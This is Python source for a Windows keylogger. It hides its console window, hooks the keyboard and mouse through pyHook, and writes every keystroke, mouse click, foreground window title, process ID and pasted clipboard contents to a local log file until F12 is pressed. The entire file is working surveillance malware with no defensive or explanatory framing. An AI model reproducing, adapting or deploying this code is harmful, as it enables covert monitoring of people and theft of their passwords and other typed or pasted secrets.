'''from ctypes import * 

import pyHook, pythoncom, win32clipboard, sys, win32api, win32console, win32gui 

current_window = None 

current_command = False 

user32 = windll.user32 

kernel32 = windll.kernel32 

psapi = windll.psapi 

win = win32console.GetConsoleWindow() 

win32gui.ShowWindow(win, 0) 

f = open(r"log.txt", 'w') 

def get_current_process(): 

    #Window handle 

    handle_window = user32.GetForegroundWindow() 

    #Get Window Title Name 

    window_title = create_string_buffer("\x00" * 512) 

    user32.GetWindowTextA(handle_window, byref(window_title), 512) 

    window_title_value = window_title.value 

    #Get Process ID 

    pid = c_ulong(0) 

    user32.GetWindowThreadProcessId(handle_window, byref(pid)) 

    pid_value = pid.value 

    #Get Executable Name 

    kernel32.CloseHandle(handle_window) 

    return (window_title_value, pid_value) 

def keyStroke(event): 

    global current_window 

    global current_command 

    #Get Window Name and Process Decription from the hooked event 

    if event.WindowName != current_window: 

        current_window = event.WindowName 

        process_info = get_current_process() 

        f.write("\n\n%s - %s" % (process_info[0], process_info[1]) + "\n") 

    #Check if Left Control is pressed 

    if event.Key == "Lcontrol": 

        current_command = True 

        f.write("[%s]" % event.Key,) 

    else: 

        #Get Clipboard data if CTRL-V 

        if current_command and event.Key == "V": 

            current_command = False 

            win32clipboard.OpenClipboard() 

            pasted_data = win32clipboard.GetClipboardData() 

            win32clipboard.CloseClipboard() 

            f.write("[PASTE] - %s" % pasted_data) 

        if event.Key == "F12": 

            f.write("\nExiting KeyLogger") 

            f.close() 

            sys.exit(0) 

        else: 

            f.write("[%s]" % event.Key) 

    return True 

#Register Hooks 

def left_down(event): 

    f.write("\nleft click") 

    return True 

def right_down(event): 

    f.write("\nright click") 

    return True 

k1 = pyHook.HookManager() 

# hook mouse 

k1.SubscribeMouseLeftDown(left_down) 

k1.SubscribeMouseRightDown(right_down) 

k1.HookMouse() 

# hook key 

k1.KeyDown = keyStroke 

k1.HookKeyboard() 

pythoncom.PumpMessages() '''